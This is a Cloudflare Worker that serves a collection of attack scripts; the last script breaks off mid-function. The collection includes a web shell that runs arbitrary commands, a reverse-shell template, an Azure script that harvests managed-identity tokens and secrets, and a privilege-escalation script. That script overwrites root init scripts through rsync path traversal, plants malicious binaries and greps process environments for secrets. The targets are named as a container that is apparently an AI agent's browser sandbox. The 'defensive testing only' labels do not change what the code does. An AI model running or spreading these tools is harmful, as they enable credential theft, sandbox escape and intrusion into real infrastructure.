// Shell Scripts Repository - Cloudflare Worker
// Simple file serving for shell scripts

const STATIC_FILES = {
  'basic-info': `#!/bin/bash
# Basic System Information Script
# FOR DEFENSIVE SECURITY TESTING ONLY

echo "=== Basic System Enumeration ==="
echo "Script started: $(date)"
echo "Hostname: $(hostname)"

echo "=== System Information ==="
echo "Kernel: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "Hostname: $(hostname)"
echo "Uptime: $(uptime)"

echo "=== User Context ==="
echo "Current user: $(whoami) ($(id))"
echo "Shell: $SHELL"
echo "Path: $PATH"

echo "=== Network Interfaces ==="
ip addr show 2>/dev/null || ifconfig 2>/dev/null

echo "=== Listening Services ==="
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null

echo "=== Running Processes ==="
ps aux 2>/dev/null | head -20

echo "=== Enumeration Complete ==="`,

  'advanced-info': `#!/bin/bash
# Advanced System Information Script
# FOR DEFENSIVE SECURITY TESTING ONLY

echo "=== Advanced System Information ==="
echo "Script started: $(date)"
echo "Hostname: $(hostname)"

echo "=== Detailed System Information ==="
echo "Kernel version: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "Operating System: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"' || uname -s)"
echo "Hardware: $(cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null || echo 'N/A')"
echo "CPU info: $(cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1 | cut -d: -f2 | sed 's/^ *//' || echo 'N/A')"
echo "CPU cores: $(nproc 2>/dev/null || echo 'N/A')"
echo "Total memory: $(free -h 2>/dev/null | awk '/^Mem/ {print $2}' || echo 'N/A')"
echo "Available memory: $(free -h 2>/dev/null | awk '/^Mem/ {print $7}' || echo 'N/A')"

echo "=== Environment Variables ==="
env | grep -E "^(PATH|HOME|USER|SHELL|PWD|LANG|TZ)" | head -10 || echo "Environment variables not accessible"

echo "=== Container/Virtualization Detection ==="
if [ -f "/.dockerenv" ]; then echo "[DETECTED] Docker container"; fi
if [ -f "/proc/1/cgroup" ]; then
  if grep -qa docker /proc/1/cgroup 2>/dev/null; then echo "[DETECTED] Docker container"; fi
  if grep -qa lxc /proc/1/cgroup 2>/dev/null; then echo "[DETECTED] LXC container"; fi
fi
if command -v systemd-detect-virt >/dev/null 2>&1; then
  virt=$(systemd-detect-virt 2>/dev/null)
  if [ "$virt" != "none" ] && [ ! -z "$virt" ]; then echo "[DETECTED] Virtualization: $virt"; fi
fi

echo "=== File System Information ==="
echo "Mounted filesystems:"
mount 2>/dev/null | head -5 || df 2>/dev/null | head -5
echo "Disk usage by filesystem:"
df -h 2>/dev/null | head -5
echo "Inode usage:"
df -i 2>/dev/null | head -5

echo "=== Network Configuration ==="
echo "Routing table:"
ip route 2>/dev/null | head -5 || route -n 2>/dev/null | head -5
echo "DNS configuration:"
cat /etc/resolv.conf 2>/dev/null | head -5 || echo "DNS config not accessible"
echo "Network connections:"
ss -tuln 2>/dev/null | head -10 || netstat -tuln 2>/dev/null | head -10
echo "ARP table:"
ip neigh 2>/dev/null | head -5 || arp -a 2>/dev/null | head -5

echo "=== Advanced Information Complete ==="
echo "Scan finished: $(date)"`,

  'network-test': `#!/bin/bash
# Network Connectivity Template - FOR DEFENSIVE TESTING ONLY

# Configuration
TARGET_IP="YOUR_IP_HERE"
TARGET_PORT="4444"

echo "=== Network Connectivity Test ==="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "WARNING: This is for authorized testing only!"

# Test various network methods
echo "Testing netcat connectivity..."
if command -v nc >/dev/null 2>&1; then
    echo "Netcat available - would execute: nc $TARGET_IP $TARGET_PORT"
else
    echo "Netcat not available"
fi

echo "Testing bash connectivity..."
echo "Would test: /dev/tcp/$TARGET_IP/$TARGET_PORT"

echo "Testing python connectivity..."
if command -v python3 >/dev/null 2>&1; then
    echo "Python3 available for network testing"
elif command -v python >/dev/null 2>&1; then
    echo "Python2 available for network testing"
else
    echo "Python not available"
fi

echo "=== Test Complete - No actual connections made ==="
echo "Replace YOUR_IP_HERE with actual target IP for testing"`,

  'service-probe': `#!/bin/bash
# Service Probe Script - FOR DEFENSIVE TESTING ONLY
# Analyzes exposed services for potential security gaps

echo "=== Service Probe Analysis ==="
echo "Started: $(date)"
echo "Host: $(hostname)"

# Define target ports from previous scan results
PORTS=(873 8888 9000 1384)

echo ""
echo "=== Port Analysis ==="
for port in "\${PORTS[@]}"; do
    echo "--- Port $port Analysis ---"
    
    # Check if port is listening
    if command -v ss >/dev/null 2>&1; then
        ss -tuln | grep ":$port " && echo "[INFO] Port $port is listening"
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tuln | grep ":$port " && echo "[INFO] Port $port is listening"
    fi
    
    # Service identification
    case $port in
        873)
            echo "[SERVICE] Port 873 typically runs rsync daemon"
            if command -v rsync >/dev/null 2>&1; then
                echo "[CHECK] Testing rsync modules..."
                timeout 5 rsync --list-only rsync://localhost/ 2>/dev/null || echo "[TIMEOUT] Rsync connection timed out"
            fi
            ;;
        8888)
            echo "[SERVICE] Port 8888 often runs Jupyter notebooks"
            echo "[CHECK] Testing HTTP response..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
        9000)
            echo "[SERVICE] Port 9000 - checking service type..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
        1384)
            echo "[SERVICE] Port 1384 - checking service type..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
    esac
    
    echo ""
done

echo "=== Probe Complete ==="
echo "Finished: $(date)"`,

  'web-shell': `#!/usr/bin/env python3
# Simple Command API Server - GET Request Version
# FOR DEFENSIVE SECURITY TESTING ONLY

import http.server
import socketserver
import subprocess
import json
import os
import urllib.parse

class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle command execution via GET request"""
        # Parse URL and query parameters
        parsed_url = urllib.parse.urlparse(self.path)
        
        if parsed_url.path == '/api/command':
            # Get command from query parameter
            query_params = urllib.parse.parse_qs(parsed_url.query)
            command = query_params.get('cmd', [''])[0].strip()
            
            if not command:
                self.send_json_response({'error': 'No command provided. Use ?cmd=your_command'}, 400)
                return
            
            # Execute command
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                # Combine stdout and stderr
                output = result.stdout
                if result.stderr:
                    output += result.stderr
                
                response_data = {
                    'command': command,
                    'output': output or '(No output)',
                    'return_code': result.returncode,
                    'success': result.returncode == 0
                }
                
                self.send_json_response(response_data)
                
            except subprocess.TimeoutExpired:
                self.send_json_response({
                    'error': 'Command timed out (30s limit)',
                    'command': command
                }, 408)
            
            except Exception as e:
                self.send_json_response({
                    'error': f'Execution error: {str(e)}',
                    'command': command
                }, 500)
        
        elif parsed_url.path == '/':
            # Simple info page
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            html = f"""
            <h1>🔧 Simple Command API</h1>
            <p><strong>Endpoint:</strong> <code>/api/command?cmd=YOUR_COMMAND</code></p>
            <p><strong>Example:</strong> <a href="/api/command?cmd=pwd">/api/command?cmd=pwd</a></p>
            <p><strong>Working Directory:</strong> {os.getcwd()}</p>
            <p style="color: red;"><strong>⚠️ WARNING:</strong> Only use on trusted networks!</p>
            """
            self.wfile.write(html.encode('utf-8'))
        
        else:
            self.send_json_response({'error': 'Endpoint not found'}, 404)
    
    def send_json_response(self, data, status_code=200):
        """Send JSON response with CORS headers"""
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode('utf-8'))
    
    def log_message(self, format, *args):
        """Simple logging"""
        print(f"[{self.date_time_string()}] {format % args}")

def main():
    PORT = int(os.environ.get('PORT', 8881))
    
    print("🔧 Simple Command API Server (GET)")
    print(f"📡 Starting on port {PORT}")
    print(f"📍 Working directory: {os.getcwd()}")
    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command?cmd=COMMAND")
    print("\\n📝 Usage Examples:")
    print(f"  http://localhost:{PORT}/api/command?cmd=pwd")
    print(f"  http://localhost:{PORT}/api/command?cmd=ls%20-la")
    print(f"  curl 'http://localhost:{PORT}/api/command?cmd=whoami'")
    print("\\n⚠️  WARNING: Only use on trusted networks!")
    
    try:
        with socketserver.TCPServer(("", PORT), CommandAPIHandler) as httpd:
            print(f"\\n✅ Server running on port {PORT}")
            print("Press Ctrl+C to stop")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\\n🛑 Server stopped")
    except Exception as e:
        print(f"\\n❌ Error: {e}")

if __name__ == "__main__":
    main()`,

  'azure-enum': `#!/bin/bash

# Azure Container IAM and Metadata Analysis Script
# Usage: ./azure_enum.sh [output_file]

OUTPUT_FILE="\${1:-azure_enum_$(date +%Y%m%d_%H%M%S).txt}"
TIMESTAMP=$(date)

# Colors for output
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m' # No Color

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_section() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "$1" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
}

run_cmd() {
    local cmd="$1"
    local description="$2"
    
    log "\${BLUE}[INFO]\${NC} $description"
    log "\${YELLOW}Command:\${NC} $cmd"
    log "---"
    
    eval "$cmd" 2>&1 | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
}

log "\${GREEN}Azure Container IAM Analysis\${NC}"
log "Started: $TIMESTAMP"
log "Container: chrome-operator-debian-alpha"
log "Build: openaiappliedcaasprod.azurecr.io/chrome-operator-debian-alpha:20250722034337-5994535d7051-linux-amd64"

# Azure Instance Metadata Service (IMDS) - Primary method
log_section "AZURE INSTANCE METADATA SERVICE (IMDS)"

# Check if IMDS is accessible
log "\${BLUE}[INFO]\${NC} Testing IMDS connectivity..."
if timeout 10 curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >/dev/null 2>&1; then
    log "\${GREEN}[SUCCESS]\${NC} IMDS is accessible"
    
    # Get instance metadata
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' "Instance Metadata"
    
    # Get compute metadata specifically
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"' "Compute Metadata"
    
    # Get network metadata
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"' "Network Metadata"
    
    # Try to get access token (if managed identity is enabled)
    log_section "AZURE MANAGED IDENTITY"
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"' "Management API Access Token"
    
    # Try different resource endpoints
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"' "Storage API Access Token"
    
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"' "Key Vault Access Token"
    
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"' "Microsoft Graph Access Token"
    
else
    log "\${RED}[ERROR]\${NC} IMDS not accessible or filtered"
fi

# Check for Azure CLI
log_section "AZURE CLI ENUMERATION"
if command -v az >/dev/null 2>&1; then
    log "\${GREEN}[SUCCESS]\${NC} Azure CLI found"
    
    run_cmd "az --version" "Azure CLI Version"
    run_cmd "az account show" "Current Account"
    run_cmd "az account list" "All Accounts"
    run_cmd "az ad signed-in-user show" "Current User"
    run_cmd "az role assignment list --assignee \\$(az ad signed-in-user show --query objectId -o tsv)" "Role Assignments"
    run_cmd "az group list" "Resource Groups"
    run_cmd "az vm list" "Virtual Machines"
    run_cmd "az storage account list" "Storage Accounts"
    run_cmd "az keyvault list" "Key Vaults"
else
    log "\${YELLOW}[INFO]\${NC} Azure CLI not found"
fi

# Check for environment variables with Azure credentials
log_section "AZURE ENVIRONMENT VARIABLES"
run_cmd 'env | grep -i azure' "Azure Environment Variables"
run_cmd 'env | grep -i client' "Client Environment Variables"  
run_cmd 'env | grep -i tenant' "Tenant Environment Variables"
run_cmd 'env | grep -i subscription' "Subscription Environment Variables"
run_cmd 'env | grep -i secret' "Secret Environment Variables"
run_cmd 'env | grep -i key' "Key Environment Variables"

# Check for Azure credential files
log_section "AZURE CREDENTIAL FILES"
run_cmd 'find / -name "*azure*" -type f 2>/dev/null | head -20' "Azure-related Files"
run_cmd 'find /home -name ".azure" -type d 2>/dev/null' "Azure CLI Config Directories"
run_cmd 'ls -la ~/.azure/ 2>/dev/null || echo "No .azure directory found"' "Azure CLI Config"
run_cmd 'cat ~/.azure/config 2>/dev/null || echo "No Azure config file"' "Azure CLI Configuration"
run_cmd 'ls -la /var/lib/waagent/ 2>/dev/null || echo "No waagent directory"' "Azure Linux Agent"

# Check for service principal files
run_cmd 'find / -name "*service*principal*" -o -name "*client*secret*" -o -name "*tenant*" 2>/dev/null | grep -v proc' "Service Principal Files"

# Check for Kubernetes service account (if in AKS)
log_section "KUBERNETES SERVICE ACCOUNT (AKS)"
run_cmd 'ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "Not in Kubernetes"' "K8s Service Account"
run_cmd 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "No K8s token"' "K8s Token"
run_cmd 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "No K8s namespace"' "K8s Namespace"

# Check for mounted Azure Storage
log_section "AZURE STORAGE MOUNTS"
run_cmd 'mount | grep -i azure' "Azure Storage Mounts"
run_cmd 'df -h | grep -i azure' "Azure Storage Usage"

# Try to access container registry info
log_section "CONTAINER REGISTRY INFO"
run_cmd 'echo "Container registry: openaiappliedcaasprod.azurecr.io"' "Registry Information"
run_cmd 'nslookup openaiappliedcaasprod.azurecr.io 2>/dev/null || echo "DNS lookup failed"' "Registry DNS"

# Check for Docker credentials
run_cmd 'cat ~/.docker/config.json 2>/dev/null || echo "No Docker config"' "Docker Credentials"
run_cmd 'ls -la /root/.docker/ 2>/dev/null || echo "No root Docker config"' "Root Docker Config"

# Network reconnaissance for Azure services
log_section "NETWORK RECONNAISSANCE"
run_cmd 'curl -s --connect-timeout 5 https://management.azure.com/ | head -5 2>/dev/null || echo "Cannot reach Azure Management API"' "Azure Management API"
run_cmd 'curl -s --connect-timeout 5 https://openaiappliedcaasprod.azurecr.io/v2/ | head -5 2>/dev/null || echo "Cannot reach Container Registry"' "Container Registry API"

# Check for MSI endpoint variations
log_section "MSI ENDPOINT VARIATIONS"
run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity?api-version=2018-02-01" 2>/dev/null || echo "MSI identity endpoint not accessible"' "MSI Identity Endpoint"
run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>/dev/null || echo "MSI info endpoint not accessible"' "MSI Info Endpoint"

# Container-specific checks
log_section "CONTAINER ANALYSIS"
run_cmd 'cat /.dockerenv 2>/dev/null || echo "Not a Docker container or no .dockerenv"' "Docker Environment"
run_cmd 'cat /proc/1/cgroup | grep -i azure' "Azure Container Groups"
run_cmd 'hostname' "Container Hostname"
run_cmd 'cat /etc/hostname' "Hostname File"

# Check for any Azure-related processes
log_section "AZURE PROCESSES"
run_cmd 'ps aux | grep -i azure' "Azure Processes"
run_cmd 'ps aux | grep -i waagent' "Azure Linux Agent Process"

log ""
log "\${GREEN}[COMPLETE]\${NC} Azure enumeration finished at $(date)"
log "\${BLUE}[INFO]\${NC} Results saved to: $OUTPUT_FILE"

# Create a summary
SUMMARY_FILE="azure_summary_$(date +%Y%m%d_%H%M%S).txt"
echo "Azure Enumeration Summary - $(date)" > "$SUMMARY_FILE"
echo "Container: chrome-operator-debian-alpha" >> "$SUMMARY_FILE"
echo "Registry: openaiappliedcaasprod.azurecr.io" >> "$SUMMARY_FILE"
echo "" >> "$SUMMARY_FILE"
echo "Key Findings:" >> "$SUMMARY_FILE"
grep -i "error\\|success\\|token\\|access" "$OUTPUT_FILE" | head -10 >> "$SUMMARY_FILE"

log "\${BLUE}[INFO]\${NC} Summary saved to: $SUMMARY_FILE"`,

  'privesc': `#!/bin/bash

OUTPUT_FILE="access_test_$(date +%Y%m%d_%H%M%S).log"
TIMESTAMP=$(date)

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m'

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_attack() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "===========================================" | tee -a "$OUTPUT_FILE"
    echo "ATTACK: $1" | tee -a "$OUTPUT_FILE"
    echo "===========================================" | tee -a "$OUTPUT_FILE"
}

test_cmd() {
    local cmd="$1"
    local description="$2"
    
    log "\${BLUE}[TEST]\${NC} $description"
    log "\${YELLOW}Command:\${NC} $cmd"
    
    if eval "$cmd" >> "$OUTPUT_FILE" 2>&1; then
        log "\${GREEN}[SUCCESS]\${NC} Command executed successfully"
        return 0
    else
        log "\${RED}[FAILED]\${NC} Command failed"
        return 1
    fi
}

exploit_cmd() {
    local cmd="$1"
    local description="$2"
    
    log "\${RED}[TEST]\${NC} $description"
    log "\${YELLOW}Command:\${NC} $cmd"
    
    eval "$cmd" | tee -a "$OUTPUT_FILE"
}

log "\${GREEN}Container Access Testing Script\${NC}"
log "Started: $TIMESTAMP"
log "Target: chrome-operator-debian-alpha container"

# ==========================================
# TEST 1: Supervisor Control
# ==========================================
log_attack "Supervisor Control Interface"

log "\${BLUE}[INFO]\${NC} Testing supervisor access..."
if test_cmd "supervisorctl status" "Check supervisor status"; then
    log "\${GREEN}[FOUND]\${NC} Supervisor control is accessible!"
    
    # Try to restart services that run as root
    log "\${BLUE}[INFO]\${NC} Attempting to restart root services..."
    
    # Services that run as root (no user= specified)
    ROOT_SERVICES=("notebook_server" "rsync_daemon" "sync_share" "chromium" "policy_merge" "certs" "mitmproxy" "test_server" "apply_patch" "container_daemon")
    
    for service in "\${ROOT_SERVICES[@]}"; do
        log "\${BLUE}[TEST]\${NC} Trying to control service: $service"
        test_cmd "supervisorctl status $service" "Check $service status"
        test_cmd "supervisorctl restart $service" "Restart $service"
    done
    
    # Try to add new program
    log "\${BLUE}[TEST]\${NC} Attempting to add test service..."
    exploit_cmd 'echo "[program:access_test]
command=/bin/bash -c \\"echo root > /tmp/access_test && chmod 777 /tmp/access_test\\"
autostart=true
user=root" | tee /tmp/test_service.conf' "Create test service config"
    
else
    log "\${RED}[FAILED]\${NC} No supervisor access"
fi

# ==========================================
# TEST 2: Init Script Analysis
# ==========================================
log_attack "Init Script File Permissions"

INIT_DIR="/usr/local/init_scripts"
log "\${BLUE}[INFO]\${NC} Checking init script permissions..."

exploit_cmd "ls -la $INIT_DIR" "List init scripts"

# Check if any scripts are writable
ROOT_SCRIPTS=("notebook_server.sh" "rsync_daemon.sh" "sync_share.sh" "policy_merge.sh" "certs.sh" "mitmproxy.sh" "test_server.sh" "apply_patch.sh" "container_daemon.sh")

for script in "\${ROOT_SCRIPTS[@]}"; do
    if [ -w "$INIT_DIR/$script" ]; then
        log "\${GREEN}[VULNERABLE]\${NC} $script is writable!"
        
        # Backup original
        exploit_cmd "cp $INIT_DIR/$script $INIT_DIR/$script.backup" "Backup original script"
        
        # Inject privilege escalation
        exploit_cmd "echo '#!/bin/bash
# Privilege escalation payload
echo \\"Privilege escalation successful at \\$(date)\\" > /tmp/root_access
chmod 777 /tmp/root_access
whoami > /tmp/current_user
id > /tmp/current_id
# Continue with original script
' > /tmp/malicious_script.sh" "Create malicious script"
        
        log "\${RED}[EXPLOIT]\${NC} Script $script can be modified for privilege escalation!"
    else
        log "\${BLUE}[INFO]\${NC} $script is not writable"
    fi
done

# ==========================================
# TEST 3: rsync Directory Testing
# ==========================================
log_attack "rsync Directory Traversal"

log "\${BLUE}[INFO]\${NC} Testing rsync write capabilities..."

# Test basic rsync access
if test_cmd "rsync --list-only rsync://localhost:873/share/" "List rsync share"; then
    log "\${GREEN}[FOUND]\${NC} rsync is accessible!"
    
    # Try directory traversal to overwrite system files
    log "\${BLUE}[EXPLOIT]\${NC} Attempting directory traversal attacks..."
    
    # Create test payload
    exploit_cmd 'echo "#!/bin/bash
echo \\"Root access gained via rsync at \\$(date)\\" > /tmp/rsync_privesc
whoami >> /tmp/rsync_privesc
id >> /tmp/rsync_privesc
" > /tmp/malicious_payload.sh && chmod +x /tmp/malicious_payload.sh' "Create rsync payload"
    
    # Try to overwrite init scripts via rsync
    for script in "\${ROOT_SCRIPTS[@]}"; do
        log "\${BLUE}[TEST]\${NC} Attempting to overwrite $script via rsync..."
        test_cmd "rsync -av /tmp/malicious_payload.sh rsync://localhost:873/share/../../../usr/local/init_scripts/$script" "Overwrite $script"
    done
    
    # Try to overwrite supervisor config
    log "\${BLUE}[TEST]\${NC} Attempting to overwrite supervisor config..."
    test_cmd "rsync -av /tmp/malicious_payload.sh rsync://localhost:873/share/../../../etc/supervisord.conf" "Overwrite supervisord.conf"
    
    # Try to write to sensitive directories
    SENSITIVE_DIRS=("etc" "root" "usr/local/bin" "var/log")
    for dir in "\${SENSITIVE_DIRS[@]}"; do
        log "\${BLUE}[TEST]\${NC} Testing write access to /$dir..."
        test_cmd "echo 'test' | rsync --stdin rsync://localhost:873/share/../../../$dir/privesc_test" "Write to /$dir"
    done
    
else
    log "\${RED}[FAILED]\${NC} rsync not accessible"
fi

# ==========================================
# TEST 4: Jupyter Code Testing
# ==========================================
log_attack "Jupyter Notebook Exploitation"

log "\${BLUE}[INFO]\${NC} Testing Jupyter access..."

# Test if Jupyter is accessible
if test_cmd "curl -s http://localhost:8888/ | head -5" "Check Jupyter accessibility"; then
    log "\${GREEN}[FOUND]\${NC} Jupyter is accessible!"
    
    # Create Python payload for file system manipulation
    exploit_cmd 'cat > /tmp/jupyter_exploit.py << '"'"'EOF'"'"'
import os
import subprocess
import sys

# Try to write to system directories
print("=== Jupyter Privilege Escalation Test ===")
print(f"Current user: {os.getenv('"'"'USER'"'"')}")
print(f"Current working directory: {os.getcwd()}")

# Try to execute system commands
try:
    result = subprocess.run(['"'"'whoami'"'"'], capture_output=True, text=True)
    print(f"whoami output: {result.stdout.strip()}")
except Exception as e:
    print(f"Error running whoami: {e}")

# Try to write to /tmp with different permissions
try:
    with open('"'"'/tmp/jupyter_privesc_test'"'"', '"'"'w'"'"') as f:
        f.write("Jupyter code execution successful\\n")
    print("Successfully wrote to /tmp")
except Exception as e:
    print(f"Error writing to /tmp: {e}")

# Try to read sensitive files
sensitive_files = ['"'"'/etc/shadow'"'"', '"'"'/etc/passwd'"'"', '"'"'/root/.bashrc'"'"']
for file in sensitive_files:
    try:
        with open(file, '"'"'r'"'"') as f:
            content = f.read()[:100]  # First 100 chars
            print(f"Can read {file}: {len(content)} chars")
    except Exception as e:
        print(f"Cannot read {file}: {e}")

# Try to modify supervisor scripts
init_scripts = ['"'"'/usr/local/init_scripts/notebook_server.sh'"'"', 
                '"'"'/usr/local/init_scripts/rsync_daemon.sh'"'"']
for script in init_scripts:
    try:
        with open(script, '"'"'r'"'"') as f:
            content = f.read()
            print(f"Can read {script}: {len(content)} chars")
        
        # Try to write
        with open(script, '"'"'a'"'"') as f:
            f.write("\\n# Jupyter modification test\\n")
            print(f"Successfully modified {script}")
    except Exception as e:
        print(f"Cannot modify {script}: {e}")
EOF' "Create Jupyter exploitation script"
    
    log "\${BLUE}[INFO]\${NC} Jupyter payload created. Manual execution required:"
    log "1. Access http://localhost:8888 in browser"
    log "2. Create new Python notebook"
    log "3. Copy and execute the content of /tmp/jupyter_exploit.py"
    
else
    log "\${RED}[FAILED]\${NC} Jupyter not accessible"
fi

# ==========================================
# TEST 5: Environment Variable Analysis
# ==========================================
log_attack "Environment Variable Exploitation"

log "\${BLUE}[INFO]\${NC} Checking for exploitable environment variables..."

# Check MITM proxy credentials
exploit_cmd "env | grep MITM" "MITM environment variables"

# Check for PATH manipulation possibilities
exploit_cmd "echo \\$PATH" "Current PATH"

# Try to create malicious binaries in PATH directories
PATH_DIRS=$(echo $PATH | tr ':' '\\n')
for dir in $PATH_DIRS; do
    if [ -w "$dir" ]; then
        log "\${GREEN}[VULNERABLE]\${NC} $dir is writable in PATH!"
        exploit_cmd "echo '#!/bin/bash
echo \\"PATH exploitation successful\\" > /tmp/path_exploit
whoami >> /tmp/path_exploit
' > $dir/malicious_binary && chmod +x $dir/malicious_binary" "Create malicious binary in $dir"
    fi
done

# ==========================================
# TEST 6: Process Analysis via /proc
# ==========================================
log_attack "Process Memory Analysis"

log "\${BLUE}[INFO]\${NC} Analyzing running processes for exploitation..."

# Look for processes running as root
exploit_cmd "ps aux | grep root | head -10" "Root processes"

# Check process environments for credentials
ROOT_PIDS=$(ps aux | grep root | grep -v '\\[' | awk '{print $2}' | head -5)
for pid in $ROOT_PIDS; do
    if [ -r "/proc/$pid/environ" ]; then
        log "\${BLUE}[INFO]\${NC} Checking environment of PID $pid..."
        exploit_cmd "cat /proc/$pid/environ | tr '\\\\0' '\\\\n' | grep -E '(SECRET|KEY|TOKEN|PASSWORD)'" "Environment of PID $pid"
    fi
done

# ==========================================
# SUMMARY AND RECOMMENDATIONS
# ==========================================
log ""
log "=========================================="
log "ACCESS TESTING SUMMARY"
log "=========================================="

log "\${BLUE}[INFO]\${NC} Exploitation attempts completed at $(date)"
log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"

# Check if any exploits were successful
if [ -f "/tmp/privesc_test" ] || [ -f "/tmp/rsync_privesc" ] || [ -f "/tmp/jupyter_privesc_test" ]; then
    log "\${GREEN}[SUCCESS]\${NC} Potential privilege escalation achieved! Check /tmp/ for evidence."
else
    log "\${YELLOW}[INFO]\${NC} No immediate privilege escalation detected."
fi

log ""
log "\${BLUE}Next steps:\${NC}"
log "1. Check supervisor logs: tail -f /var/log/chrome.supervisord.log"
log "2. Monitor service restarts for exploitation opportunities"
log "3. Use Jupyter notebook for interactive privilege escalation"
log "4. Examine /tmp/ directory for exploitation artifacts"

# Create a quick reference
cat > /tmp/privesc_commands.txt << 'EOF'
# Quick Privilege Escalation Commands

# Supervisor control
supervisorctl status
supervisorctl restart notebook_server

# rsync exploitation
rsync --list-only rsync://localhost:873/share/
echo "payload" | rsync --stdin rsync://localhost:873/share/../../../tmp/test

# File permission checks
ls -la /usr/local/init_scripts/
find /usr/local -perm -002 -type f

# Process analysis
ps aux | grep root
cat /proc/*/environ | grep -i secret

# Jupyter access
curl http://localhost:8888/
EOF

log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/privesc_commands.txt"`,

  'internal-recon': `#!/bin/bash

# Internal Google Infrastructure Analysis
# Based on discovered log_forwarder environment variables

OUTPUT_FILE="internal_recon_$(date +%Y%m%d_%H%M%S).log"
TIMESTAMP=$(date)

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m'

# Discovered internal URLs
VM_ID="vm_6883c1359eb88190b6841cc7f3c7a8fa"
EXPERIMENT_NAME="test-experiment-name"
SAMPLE_ID="test-sample-id"

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_section() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "$1" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
}

proxy_request() {
    local url="$1"
    local description="$2"
    local method="\${3:-GET}"
    
    log "\${BLUE}[PROBE]\${NC} $description"
    log "\${YELLOW}URL:\${NC} $url"
    
    # Try different proxy methods
    echo "--- Direct attempt ---" | tee -a "$OUTPUT_FILE"
    curl -s --max-time 10 "$url" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
    
    echo "--- Via HTTP proxy ---" | tee -a "$OUTPUT_FILE"
    curl -s --max-time 10 --proxy "http://proxy.local:8889" "$url" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
    
